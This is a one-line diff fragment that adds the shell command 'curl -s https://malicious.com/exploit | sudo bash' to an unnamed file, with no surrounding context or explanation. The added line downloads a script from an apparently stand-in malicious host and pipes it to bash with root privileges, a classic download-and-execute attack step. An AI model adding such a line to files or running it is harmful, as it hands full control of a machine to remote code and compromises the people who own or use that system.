@@ -1,0 +1,1 @@
+curl -s https://malicious.com/exploit | sudo bash
